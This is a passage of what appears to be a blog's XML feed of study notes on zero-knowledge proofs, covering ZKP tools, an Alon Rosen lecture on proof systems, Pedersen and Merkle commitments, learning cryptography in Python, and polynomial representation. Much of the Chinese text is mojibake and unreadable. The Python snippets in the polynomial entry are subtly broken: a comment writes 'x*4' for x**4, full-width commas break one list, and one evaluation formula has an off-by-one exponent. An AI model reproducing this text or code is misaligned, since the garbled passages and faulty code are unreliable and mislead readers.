        <content type="html"><![CDATA[<h1 id="é›¶çŸ¥è¯†è¯æ˜">é›¶çŸ¥è¯†è¯æ˜</h1><p>Â·åˆå§‹åŒ–ç®—æ³•ï¼šè¯æ˜å…¬é’¥+éªŒè¯å…¬é’¥-è¦è¯æ˜çš„é—®é¢˜Â·è¯æ˜ç®—æ³•ï¼šè¯æ˜-è¯æ˜å…¬é’¥+è¯æ˜å…¬å¼€æ•°æ®+è¯æ˜ç§æœ‰æ•°æ®Â·éªŒè¯ç®—æ³•ï¼šéªŒè¯é€šè¿‡/ä¸é€šè¿‡-éªŒè¯å…¬é’¥+è¯æ˜å…¬å¼€æ•°æ®+è¯æ˜</p><h2 id="é›¶çŸ¥è¯†è¯æ˜çš„æ€§èƒ½æŒ‡æ ‡">é›¶çŸ¥è¯†è¯æ˜çš„æ€§èƒ½æŒ‡æ ‡</h2><p>Â·è¯æ˜æ—¶é—´ Â·éªŒè¯æ—¶é—´ï¼šå†³å®šäº†é“¾ä¸Šæ‰§è¡Œçš„ gas æ¶ˆè€—Â·è¯æ˜å¤§å°ï¼šå†³å®šäº†äº¤æ˜“å¤§å°å’Œé“¾ä¸Šæ¶ˆè€— Â·å®‰å…¨å‡è®¾Â·Zk-Snarkï¼šå¼€å‘å·¥å…·ç›¸å¯¹æˆç†Ÿï¼Œæ ¸å¿ƒç®—æ³•ä»£ç ç›¸å¯¹æˆç†Ÿï¼Œä»¥å¤ªåŠ/Confluxä¸»ç½‘æœ‰å†…ç½®åˆçº¦æ”¯æŒï¼Œè¯æ˜é•¿åº¦å°ã€‚éœ€è¦ trusted setupï¼Œéé‡å­å®‰å…¨ã€‚</p><h2 id="å¼€å‘è€…éœ€è¦åšå“ªäº›éƒ¨åˆ†">å¼€å‘è€…éœ€è¦åšå“ªäº›éƒ¨åˆ†</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/develop_zkp.png"alt="develop_zkp" /><figcaption aria-hidden="true">develop_zkp</figcaption></figure><h2 id="æ‰©å±•ææ–™">æ‰©å±•ææ–™</h2><p>é›¶çŸ¥è¯†è¯æ˜ç³»ç»Ÿ https://zkp.science/</p><p>ä¸Šå±‚æ„å»ºå·¥å…·</p><ul><li>ZokRates https://zokrates.github.io/</li><li>Zinc https://github.com/matter-labs/zinc</li><li>Cairoï¼ˆé€šç”¨ cpu ç”µè·¯ï¼‰ https://www.cairo-lang.org/</li></ul><p>åº•å±‚åº“</p><ul><li>Libsnark:https://github.com/scipr-lab/libsnark</li></ul><p>ç ”ç©¶é—®é¢˜ Â·å­¦æœ¯ç ”ç©¶ï¼š Â·å¦‚ä½•è®¾è®¡æ›´å¥½çš„é›¶çŸ¥è¯†è¯æ˜ç³»ç»Ÿï¼ŸÂ·å¦‚ä½•å®ç°é›¶çŸ¥è¯†è¯æ˜è¿ç®—çš„å®‰å…¨å¤–åŒ…ï¼Ÿ</p><p>å·¥ç¨‹ç ”ç©¶ï¼š Â·å¦‚ä½•è§£å†³ zkRollup ä¸­å¿ƒåŒ–çš„é—®é¢˜ï¼Ÿ</p><p>é›¶çŸ¥è¯†è¯æ˜æœ€å¤§çš„å±€é™æ€§åœ¨äºï¼š</p><p>å®ƒè¦æŠŠæ‰€æœ‰çš„éšç§æ‹¿åœ¨ä¸€æ–¹æ‰‹ä¸­ï¼Œè®©è¯¥æ–¹ç”Ÿæˆè¯æ˜ã€‚å¯¹äºæ•°æ®æŒ–æ˜çš„åœºæ™¯ä¸‹ï¼Œéšç§æ˜¯åˆ†æ•£åœ¨å„æ–¹çš„ï¼Œé‚£å°±ä¸èƒ½ç›´æ¥è¿ç”¨é›¶çŸ¥è¯†è¯æ˜äº†ã€‚</p><h2 id="zkp-å¼€å‘å·¥å…·">zkp å¼€å‘å·¥å…·</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/develop_tools.png"alt="develop_tools" /><figcaption aria-hidden="true">develop_tools</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Introduction Zero Knowledge -- Alon Rosen</title>
      <link href="/blog/2023/03/30/crypto/zk/0.zk_intro3/"/>
      <url>/blog/2023/03/30/crypto/zk/0.zk_intro3/</url>
      
        <content type="html"><![CDATA[<h1 id="introduction-zero-knowledge----alon-rosen">Introduction ZeroKnowledge -- Alon Rosen</h1><h2 id="zero-knowledge-proofs">Zero-Knowledge Proofs</h2><p>It's mainly about the content of <ahref="https://www.youtube.com/watch?v=6uGimDYZPMw&amp;list=PL8Vt-7cSFnw29cLUVqAIuMlg1QJ-szV0K&amp;index=2">The9th BIU Winter School on Cryptography-Zero Knowledge</a> and someunderstanding of my own.</p><h2 id="what-is-zero-knowledge-good-for">What is zero knowledge goodfor</h2><p>Can prove that I know a secret without having to reveal it.</p><ol type="1"><li><p>Identification, Membership, Ownership and so on</p><p>A zero-knowledge identity proof is a term used to refer to anauthentication scheme where one party proves to the other to have aparticular piece of knowledge that proves ownership of theidentity.</p></li><li><p>Protocol Design</p><ol type="1"><li><p>Design against parties that <strong>follow instructions</strong>.(against é’ˆå¯¹)</p><p>Secure against arbitrary deviation from the protocol.</p></li><li><p>Use ZK proof to <strong>force honest behavior</strong></p></li></ol></li></ol><p>Trusted Party, a general cryptography framework which is more generaleven than zero knowledge, can be turned into a cryptographic protocolusing zero-knowledge. Zero knowledge is what enables us to go<strong>from a setting which we trust into a setting in which we don'ttrust.</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[&quot;Trusted Party&quot;] --&quot;Zero-Knowledge Proof&quot;--&gt; B[&quot;Protocol&quot;]</span><br></pre></td></tr></table></figure><p>Note: Crypto is not just about zero knowledge. Zero-Knowledge is justa means to an end.</p><p>Weaker definitions are also useful. (WI/WH/NIZK)</p><h2 id="proof-systems">Proof Systems</h2><p>A proof is a method for establishing truth. what is the methoddepends on the context in which it's deployed, such as legal(truth isdetermined by a jury or by a judge), authoritative, scientific,philosophical, mathematical(Axiom -&gt;Ï€-&gt;-&gt; Propositions).</p><p>Euclid put forward that inference should be cast in terms of axiomsand <em>rules of inference</em>. After that,</p><p>Two element have been added to the notion of proof:<strong>probabilistic and interactive</strong>. You are willing toaccept that small statement with the small probability of error and thenotion of interaction</p><h3 id="the-language-of-true-statements">The language of truestatements</h3><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416222657082.png"alt="image-20220416222657082" /><figcaption aria-hidden="true">image-20220416222657082</figcaption></figure><p>There is no prover here. To define a classic proof, you don't need totalk about prover at all and verifier is what matters. <strong>Theverifier is the most important entity</strong> in a proof and this isalso for people implementing a protocol. All that matters is what theverifier does at least for the soundness of proof.</p><h3 id="np-proof-system">NP Proof System</h3><p><ahref="https://blog.csdn.net/qq_21768483/article/details/80430590">Pé—®é¢˜ã€NP é—®é¢˜ã€NP å®Œå…¨é—®é¢˜å’Œ NP éš¾é—®é¢˜</a></p><p><ahref="https://sailist.github.io/AdAlgo/#%E5%9B%BE%E7%81%B5%E6%9C%BA%E4%B8%8Epnpnpc">é«˜çº§ç®—æ³•P NP å›¾çµæœºä¸çº¦åŒ– | AdAlgo</a></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416222935487.png"alt="image-20220416222935487" /><figcaption aria-hidden="true">image-20220416222935487</figcaption></figure><p><strong>Boolean Satisfiabilityã€å¸ƒå°”å¯æ»¡è¶³æ€§é—®é¢˜ SATã€‘</strong></p><p><strong>SAT æ˜¯ä¸€ä¸ª NPC é—®é¢˜</strong>ï¼Œæ¯ä¸€ä¸ªå±äº NP çš„éƒ½å¯ä»¥å½’çº³åˆ°SAT é—®é¢˜ä¸Šã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416224814534.png"alt="image-20220416224814534" /><figcaption aria-hidden="true">image-20220416224814534</figcaption></figure><p><strong>çº¿æ€§ç­‰å¼</strong>ï¼šP é—®é¢˜ï¼Œå®¹æ˜“è®¡ç®—ã€‚Structuredï¼šæ˜¯ä¸€ä¸ªç»“æ„åŒ–çš„é—®é¢˜ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416224928445.png"alt="image-20220416224928445" /><figcaption aria-hidden="true">image-20220416224928445</figcaption></figure><p>çŸ©é˜µä¹˜æ³• linear equations æ˜¯ P é—®é¢˜ï¼ŒæœŸæœ€ä½³æ¸è¿›å¤æ‚åº¦ä¸º<spanclass="math inline">\(O(n^{2.373})\)</span>.<ahref="https://en.wikipedia.org/wiki/Matrix_multiplication_algorithm#:~:text=As%20of%20December%C2%A02020%2C%20the%20matrix%20multiplication%20algorithm%20with%20best%20asymptotic%20complexity%20runs%20in%20O(n2.3728596)%20time">wikipediareference</a></p><p><strong>the Class Pï¼šP ç±»é—®é¢˜</strong> poly-time(å¤šé¡¹å¼æ—¶é—´) Pç±»é—®é¢˜ï¼šåœ¨å¤šé¡¹å¼æ—¶é—´ä¸‹æœ‰è§£ã€‚ NPç±»é—®é¢˜ï¼šåœ¨å¤šé¡¹å¼æ—¶é—´ä¸‹ä¸èƒ½ç¡®å®šèƒ½æ‰¾åˆ°ç­”æ¡ˆï¼Œä½†å¯éªŒè¯ã€‚ NPC ç±»é—®é¢˜ï¼šNPç±»é—®é¢˜éƒ½å¯ä»¥å½’çº¦åˆ°ä¸€ä¸ª NPC ç±»é—®é¢˜ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416225029312.png"alt="image-20220416225029312" /><figcaption aria-hidden="true">image-20220416225029312</figcaption></figure><p><strong>äºŒæ¬¡å‰©ä½™ Quadratic Residuosity</strong></p><p><ahref="https://www.youtube.com/watch?v=EJv4TiYP8-s&amp;list=PLXICrha0Si3oMaUzKeQVKAKc9u71Xdnsh">[QuadraticResidues] - What are Quadratic Residues? - YouTube</a></p><p>æ˜¯ä¸€ä¸ª NPé—®é¢˜ï¼Œåœ¨å¤šé¡¹å¼æ—¶é—´å†…ä¸ä¸€å®šèƒ½è§£å‡ºæ¥ï¼Œä½†æ˜¯ä¸€å®šèƒ½åœ¨å¤šé¡¹å¼æ—¶é—´å†…èƒ½éªŒè¯ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416225205379.png"alt="image-20220416225205379" /><figcaption aria-hidden="true">image-20220416225205379</figcaption></figure><p><strong>æ€»ç»“</strong> æœ‰æ•ˆçš„éªŒè¯è€… ç­‰ä»·äºå¤šé¡¹å¼æ—¶é—´çš„éªŒè¯è€…ï¼Œä¸‹é¢è¯´æ˜å¦‚æœæ˜¯ä¸‹é¢çš„é—®é¢˜ï¼Œåˆ™éƒ½æ˜¯å¯ä»¥åœ¨å¤šé¡¹å¼æ—¶é—´ä¸‹å¯éªŒè¯çš„é—®é¢˜ï¼Œå³è¯´æ˜æ˜¯æœ‰æ•ˆçš„éªŒè¯ã€‚</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416225306186.png"alt="image-20220416225306186" /><figcaption aria-hidden="true">image-20220416225306186</figcaption></figure><p><strong>è¯æ˜éæˆå‘˜</strong></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/image-20220416225429285.png"alt="image-20220416225429285" /><figcaption aria-hidden="true">image-20220416225429285</figcaption></figure><ol type="1"><li><p>å¯¹äº Linear Equation æ˜¯ P é—®é¢˜ï¼Œå¯ä»¥åœ¨å¤šé¡¹å¼æ—¶é—´å†…ç¡®å®šã€‚</p></li><li><p>å¯¹äº SAT å’ŒäºŒæ¬¡å‰©ä½™æ˜¯ NP é—®é¢˜ï¼Œæ— æ³•åœ¨å¤šé¡¹å¼æ—¶é—´å†…ç¡®å®šã€‚</p><p>æœ€åŸå§‹çš„è¯æ˜å°±æ˜¯ï¼šå‘é€æ‰€æœ‰å¯èƒ½çš„ witnessï¼Œé€ä¸ªæ£€æŸ¥ä»–æ˜¯å¦æ»¡è¶³ SAT æˆ–QRã€‚è€ŒäºŒè€…çš„ witness éƒ½æ˜¯æŒ‰æŒ‡æ•°å¢é•¿çš„ã€‚æ‰€ä»¥ naive proof exponentiallylarge æŒ‰ç…§æŒ‡æ•°å¢å¤§ã€‚æ‰€ä»¥ç°åœ¨æ²¡æœ‰ä»€ä¹ˆå¯ä»¥å¸®åŠ©ä½ éªŒè¯ non-membership çš„statement çš„ã€‚è¿™ä¾¿æ˜¯ Shafi Goldwass ç­‰äººæƒ³æ³•çš„æ¥æºã€‚</p><p>ä»–ä»¬åœ¨ GMRâ€™85ä¸­æå‡ºäº†äº¤äº’å¼è¯æ˜ï¼Œå…è®¸è¯æ˜ä½¿ç”¨ï¼šéšæœºæ€§ï¼ˆæ¦‚ç‡å®¹é”™ï¼‰å’Œäº¤äº’ï¼ˆå¢åŠ proverï¼‰</p></li></ol><h2 id="ä»-dapp-å¼€å‘è§’åº¦çœ‹">ä» DAPP å¼€å‘è§’åº¦çœ‹</h2><p>ç›¸å…³å†…å®¹çš„å…¬å¼€èµ„æ–™å¾ˆä¸°å¯Œï¼Œæˆ‘ post ä¸€äº›å¸Œæœ›å¯¹ä½ æœ‰å¸®åŠ©ï¼š</p><p>ä»éœ€æ±‚å‡ºå‘å¦‚ä½•æ ¹æ®ä¸åŒ zk æŠ€æœ¯çš„ tradeoffs è¿›è¡Œæ–¹æ¡ˆè®¾è®¡:</p><ol type="1"><li><p><ahref="https://www.youtube.com/watch?v=-PUKinjbLR8&amp;list=PLaM7G4Llrb7x5JgkfCN9kf7IB6QtomyCu&amp;index=24">ZKApplication Design Patterns | Devcon BogotÃ¡</a></p></li><li><p><ahref="https://vitalik.ca/general/2022/06/15/using_snarks.html">ä»éšç§ä¿æŠ¤çš„éœ€æ±‚å‡ºå‘ï¼Œå¦‚ä½•æŠŠzkSnark fit into ç°æœ‰åº”ç”¨</a></p></li><li><p>å…·ä½“åº”ç”¨çš„äº¤äº’å»ºè®®çœ‹ä¸€äº› zk dappçš„æºç ä»¥åŠåœ¨æœ¬åœ°è·‘ä¸€è·‘å®¢æˆ·ç«¯ï¼Œè¿™æ ·ä¼šæœ‰æ›´ç›´è§‚çš„ç†è§£ï¼šä¾‹å¦‚ï¼šhttps://github.com/vplasencia/zkSudoku</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Commitment and Overview of Modern SNARKs</title>
      <link href="/blog/2023/03/30/crypto/zk/9.commitments/"/>
      <url>/blog/2023/03/30/crypto/zk/9.commitments/</url>
      
        <content type="html"><![CDATA[<h1 id="commitment">Commitment</h1><p>Two security properties about commitment:</p><ul><li>Binding: Two different statements can't make the samecommitment</li><li>Hiding: Given a commitment, nothing is known about thestatement</li></ul><p>Commitment scheme ä¸­çš„ Setup(<spanclass="math inline">\(1^\lambda\)</span>) ä¸­ </p><p>In the context of a commitment scheme, Setup(<spanclass="math inline">\(1^\lambda\)</span>) refers to a probabilisticpolynomial-time (PPT) algorithm that takes a security parameter (inunary) and generates public parameters. The notation <spanclass="math inline">\(1^\lambda\)</span> means that the input to thealgorithm is a string of <span class="math inline">\(\lambda\)</span>ones, which is used as the security parameter.</p><p>In computer science, unary refers to a numeral system in which eachnatural number is represented by a corresponding number of 1s. Forexample, the number 3 would be represented as "111" in unary. Therefore,in the context of a security parameter, <spanclass="math inline">\(1^\lambda\)</span> means that the input to thealgorithm is a string of <span class="math inline">\(\lambda\)</span>ones. In the unary numeral system, the number 10 is represented by tenones: "1111111111".</p><p>PPT Algorithm stands for Probabilistic Polynomial-Time Algorithm. Itis an algorithm that runs in polynomial time but also has access to someoracle that provides true random bits12. The algorithm is used incryptography and is a type of randomized algorithm</p><h2 id="overview-of-modern-snarks">Overview of Modern SNARKs</h2><p>The modern SNARK has three gradients: <strong>arithmetization, IOPinteractive oracle proof, and a commitment scheme</strong>, which leadsto a non-interactive proof system. Arithmetization involves<strong>reducing</strong> the complexity of checking correctness into aless complex circuit satisfaction problem <strong>by making computationscompatible with IOP</strong>. IOP is an idealized protocol that involvesinteraction between the prover and verifier, where the verifier sends amessage and the prover responds with an oracle. The commitment schemecompiles the idealized protocol to a real-world realization usingcryptographic assumptions. Finally, a Fiat-Shamir transform is used toobtain a non-interactive proof by hashing the history of interactioninto a transcript and deriving randomness in a public way.</p><p>Arithmetization --&gt; IOP interactive oracle proof --compiled by--&gt; commitment scheme --&gt;a real-world proof system ï¼ˆanon-interactive proofï¼‰</p><ol type="1"><li><p>Arithmetization To make a real world program or computationcompatible with the IOP, we need to arithmetize it. we need to reducethe complexity of checking the correctness into a less complex circuitsatisfaction problem. We reduce the check to just a few probabilisticalgebraic checks.</p><p>The correctness of the computation or arbitrary computation isreduced by arithmetization to some circuit satisfaction problems. and wethen pick a suitable IOP to check the circuit satisfaction problem, andthen we instantiate the IOP using the cryptographic compiler to get aproof system.</p></li><li><p>The interactive oracle proof is an information-theoreticalobject. It makes some very idealized assumptions.</p><p>IOP describes a serious interaction between the prover and verifier.The verifier sends a message to the prover, and the prover responds withoracle, which looks like a locked box. The prover can read the wholemessage sent by the verifier, but the verifier can only have restrictedaccess to the prover's message that the verifier only read the prover'smessage using point queries that are randomized.</p><p>IOP is information-theoretic so that it makes Soundness and zkguarantees that hold against the computationally unbounded prover andverifier. It's an idealized protocol that holds against idealizedparties and adversaries.</p><p>A cryptographic primitive known as a commitment scheme is a way toimplement the physical boxes algorithmically. In other word, commitmentscheme compiles the IOP from an idealized protocol to a real-worldrealization</p><p>To realize or instantiate the idealized protocols, what we need is tointroduce certain cryptographic assumptions (for example, discrete logassumption, and collisions of the hash functions).</p><p>cryptographic compilers introduce a cryptographic assumption</p></li><li><p>In Practice, we then get a non-interactive proof by using aFiat-Shamir transform</p><p>what the transform does is that it hashes the history of theinteraction into a transcript, and uses the transcript the deriverandomness in a public way so that the prover cannot predict thechallenge picked by the verifier.</p></li></ol><h2 id="commitment-scheme">Commitment scheme</h2><ol type="1"><li>Setup(1^) -&gt; pp</li><li>Commit(pp; m) -&gt; (C; r)</li><li>Open(pp; C; m, r) -&gt; - 0\1</li></ol><h2 id="vector-commitments">Vector commitments</h2><h3 id="pederson-commitment">Pederson commitment</h3><p>The Pederson commitment scheme has hiding and binding propertiesbased on the discrete log hard problem. It works over a finite fieldwith prime order p, Fp.</p><p>The zero Knowledge property is not being cared about in the Pedersoncommitment.</p><ol type="1"><li><p>Setup(1^) -&gt; pp=[<span class="math inline">\(|G|_p\)</span>group with order p, <span class="math inline">\(G_1,G_2 \in G\)</span>],where <span class="math inline">\(G_1\)</span>, <spanclass="math inline">\(G_2\)</span> is two generator</p></li><li><p>Commit(pp; m) -&gt; (<spanclass="math inline">\(C=[m]G_1+[r]G_2\)</span>; r is random chosed fromFp) <span class="math inline">\([m]G_1\)</span> is the additivenotation, which means m times group operation of <spanclass="math inline">\(G_1\)</span>. It can also be seen as a sclar <spanclass="math inline">\(r\)</span> multiply the group element <spanclass="math inline">\(G_1\)</span>. The multiplicative notation, g^m,can also be seen in other place, which also means m times groupoperation of <span class="math inline">\(g\)</span></p></li><li><p>Open(pp; C; m, r) -&gt; - <span class="math inline">\(C ?=[m]G_1+[r]G_2\)</span></p><p>Normally, the open can be separated into two steps: Prove andVerify.</p><ol type="1"><li>Prove(pp, C, m, r) -&gt; <span class="math inline">\(\pi\)</span>,where the proof is (m, r) in the Pederson commitment. The proof will notreveal the m and r in the KZG commitment.</li><li>Verify(pp, C, <span class="math inline">\(\pi\)</span>) -&gt;0,1</li></ol></li></ol><p>Pedersen is a homomorphic commitment scheme (additive homomorphism)that is computationally hiding and binding. <spanclass="math inline">\(Commitment(m_1 â—¦ m_2) = Commitment(m_1) â—¦Commitment(m_2)\)</span></p><p>KZG10 is homomorphic polynomial commitments, but Merkle tree vectorcommitment is not one.</p><blockquote><p>Homomorphic commitments: we require our commitments to support anhomomorphic operation â—¦. Requiring homomorphism rules out Merkle Treesas a solution. Homomorphic properties of commitments to â€œstructuredobjectsâ€ have wide applications in cryptography (see, e.g., [KZG10] forhomomorphic polynomial commitments). The homomorphic property is anatural one and allows many useful applications ref: <ahref="https://eprint.iacr.org/2021/1678.pdf">Zero-Knowledge forHomomorphic Key-Value Commitments with Applications toPrivacy-Preserving Ledgers</a></p></blockquote><h3 id="vector-pederson-commitment">Vector Pederson Commitment</h3><p>Vector Pederson Commitment is an extension used in the inner-productargument, which used in bulletproof. It's a really good proving systemfor efficient range proof.</p><p>It works over the message space of vectors, <spanclass="math inline">\(F^k_p\)</span>. vectors with k element fromFp.</p><ol type="1"><li><span class="math inline">\(Setup(1^\lambda, k) -&gt;{G_i}_{i=0}^{k-1}\)</span></li><li><span class="math inline">\(Commit(pp, m;r)â€‹=[m_0â€‹]G_0â€‹+â‹¯+[m_{nâˆ’1}â€‹]G_{nâˆ’1}â€‹+[r]H=âˆ‘^{nâˆ’1}_{i=0}â€‹[m_iâ€‹]G_iâ€‹\)</span>+[r]H.â€‹</li></ol><p>The proof size of vector Pedersen commitment is linear, which ishuge.</p><blockquote><p>ref: <ahref="https://zcash.github.io/halo2/background/groups.html">Cryptographicgroups - The halo2 Book</a></p></blockquote><h2 id="vector-merkle-tree-commitment">Vector Merkle treeCommitment</h2><p>The commitment works over the message space string, <spanclass="math inline">\({0,1}_k\)</span></p><ol type="1"><li><span class="math inline">\(Commitment(pp, \vec{m}) -&gt; C =root(Merkle(\vec{m}))\)</span></li><li>Open:<ol type="1"><li><span class="math inline">\(Prove(pp, i, C, \vec{m}) -&gt; \pi =(m[i], path)\)</span></li><li><span class="math inline">\(Verify(pp, i, C, \pi) -&gt;0/1\)</span></li></ol></li></ol><h2 id="polynomial-commitments">Polynomial commitments</h2><p>KZG10</p><p>TODO</p><ul><li>[ ]</li></ul><h2 id="notice">Notice</h2><p>é“ç†ä¸Šæ¥è®²ï¼Œæ ¹æ®è¿ç®—çš„è®°å·ä¸åŒï¼ˆæ˜¯ + è¿˜æ˜¯xï¼‰é’ˆå¯¹ç¾¤çš„ä¹˜æ³•è¿ç®—ï¼Œç”¨æŒ‡æ•°è®°æ³• G^{x}ï¼Œé’ˆå¯¹ç¾¤çš„åŠ æ³•è¿ç®—ï¼š [x]G å’Œ xGéƒ½å¯,éƒ½æ˜¯å¯¹è¿ç®—è¿›è¡Œ x éï¼Œä½†æ˜¯æ¨è [x]G</p><p>å®é™…ä¸Šä¸€èˆ¬ paperé‡Œé¢ï¼ŒåŸºæœ¬æ··ç”¨ï¼Œèƒ½çœ‹æ˜ç™½ï¼Œè¡¨è¾¾æ¸…æ¥šå°±å¥½,å°±æ˜¯ç¬¦å·è®°æ³•ä¹ æƒ¯ï¼Œä¸ºäº†ä¸æœ´ç´ åŠ æ³•ä¹˜æ³•ç›¸å®¹ã€‚</p><p>åŒçº¿æ€§æ˜ å°„ï¼šhttps://mp.weixin.qq.com/s/ug6PVMvR3UtGQgXZopWqgQ</p><p>äºŒæ¬¡éå‰©ä½™çš„ä¾‹å­å°±æ˜¯å¦‚ä½•æŠŠ coNPé—®é¢˜è½¬åŒ–ä¸ºäº¤äº’å¼é›¶çŸ¥è¯†è¯æ˜,å¦‚æœç”¨ç»å…¸çš„è¯æ˜æ–¹å¼ï¼Œé™¤ééå†æ‰€æœ‰å¯èƒ½å–å€¼ï¼Œå¦åˆ™æ— æ³•è¯æ˜å¯¹NP é—®é¢˜æ— è§£</p><h2 id="references">References</h2><ol type="1"><li><a href="./zk/media/ppt-notes.pdf">PPT Algorithmhttps://www.cs.miami.edu/home/burt/learning/csc609.221/notes/ppt-notes.pdf</a></li><li>[./media/commitments.pdf]</li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Learn cryptography via Python3</title>
      <link href="/blog/2023/03/30/crypto/zk/9.learn_crypto/"/>
      <url>/blog/2023/03/30/crypto/zk/9.learn_crypto/</url>
      
        <content type="html"><![CDATA[<h1 id="learn-cryptography-via-python3">Learn cryptography viaPython3</h1><p>There is a steep learning curve for learning cryptography,specifically zero knowledge proof. Qi zhou shared a great learningmethod: learning it via programming.</p><p>Every time you learn a cryptographic primitive, get a correspondingcode, and see the principle.</p><ul><li>Observe programming examples</li><li>Modify the program and see different results</li><li>Early performance benchmark</li><li>practice the usage of functions, and writing Examples Start yourproject - KZG, Plonk, etc.</li></ul><p>Python is a scripting language with native big integer support, whichis easy to implement crypto ideas.</p><p>Many famous cryptography researchers, including Vitalik, are usingpython3, and Ethereum 2.0 spec is also written in Python3</p><p>Good libraries:</p><ol type="1"><li><p><ahref="https://github.com/ethereum/research">ethereum/research</a></p><p>a lot of treasuries, Fq, polynomial over Fq, FFT</p></li><li><p><ahref="https://github.com/ethereum/py_pairing">ethereum/py_pairing:Elliptic curve operations, including pairings</a></p></li><li><p><a href="https://github.com/ethereum/py_ecc">ethereum/py_ecc:Python implementation of ECC pairing and bn_128 and bls12_381 curveoperations</a></p></li><li><p><ahref="https://github.com/Chia-Network/bls-signatures/tree/main/python-impl">bls-signatures/python-implat main Â· Chia-Network/bls-signatures Â· GitHub</a></p><p>Chiaâ€™s BLS library with ECC</p></li></ol><h2 id="common-used-libraries">Common used libraries</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from basic_crypto.poly_utils import PrimeField # operation at or between polynomials</span><br><span class="line">from basic_crypto.fft import fft</span><br><span class="line">from poly_commit.bls.fields import Fq</span><br></pre></td></tr></table></figure><p>For polynomial over Prime field</p><p>The prime root for the root of unity of BLS12-381 can be 5 or 7.</p><p>TODO</p><ul class="task-list"><li><label><input type="checkbox" />dd</label></li></ul><h2 id="references">References</h2><p><ahref="https://docs.google.com/presentation/d/1HgJaONmF1Yd-FMxXihwLvnT4oa61tAeAA_qeZjgmhHY/edit?pli=1#slide=id.g23b371aae75_0_5">LearningCrypto via Python3 qi zhou</a></p>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Polynomial and representations</title>
      <link href="/blog/2023/03/30/crypto/zk/9.polynomial/"/>
      <url>/blog/2023/03/30/crypto/zk/9.polynomial/</url>
      
        <content type="html"><![CDATA[<h1 id="polynomial">Polynomial</h1><p>In this article, I will show two common ways to programpolynomial</p><h2 id="coefficient-and-point-value-representation">coefficient andpoint-value representation</h2><p>å¯¹äº degree = n-1 å¤šé¡¹å¼ A(x)ï¼Œ</p><ol type="1"><li>Coefficient representation: æ‰€æœ‰é¡¹çš„ç³»æ•°ç»„æˆçš„ç³»æ•°å‘é‡ <spanclass="math inline">\((a_0, a_1,a_2,...,a_{n-1})\)</span>å”¯ä¸€ç¡®å®šå¤šé¡¹å¼:<span class="math inline">\(A(x) =\sum_{i=0}^{n-1}a_ix^i\)</span></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># f(x) = x*4 + 3*x**2 + 4*x + 9</span></span><br><span class="line">coefficient = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>] <span class="comment"># [a4, a3, a2, a1, a0]</span></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">coefficient = [<span class="number">9</span>ï¼Œ<span class="number">4</span>ï¼Œ<span class="number">3</span>ï¼Œ<span class="number">0</span>ï¼Œ<span class="number">1</span>] <span class="comment"># [a0, a1, a2, a3, a4]</span></span><br></pre></td></tr></table></figure><p>Evalute polynomial at <span class="math inline">\(x=2\)</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">coeff = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>]</span><br><span class="line"><span class="comment"># evalute at x=2</span></span><br><span class="line">x,p = <span class="number">2</span>, <span class="number">17</span></span><br><span class="line"><span class="built_in">sum</span>([coeff[i] *<span class="built_in">pow</span>(x, (<span class="built_in">len</span>(coeff)-i), p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(coeff))])  % p</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="built_in">sum</span>([coeff[i]*<span class="built_in">pow</span>(x, i,p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(coeff))]) % p</span><br></pre></td></tr></table></figure><p>Note:</p><ol type="1"><li><p>the order of the coefficient should be checked carefully.</p><p>For example, <code>numpy.poly</code> expresses the sequence of thecoefficient from highest to lowest degree,<code>[a4, a3, a2, a1, a0]</code>.</p><blockquote><p><ahref="https://numpy.org/doc/stable/reference/generated/numpy.poly.html">numpy.polyâ€” NumPy v1.24 Manual</a></p></blockquote><p><strong>But</strong> Ethereum research repository is from lowest tohighest degree, <code>[a0, a1, a2, a3, a4]</code>, which we willuse.</p></li><li><p>When evaluating the coefficient form polynomial at x under Primefield, the Python built-in 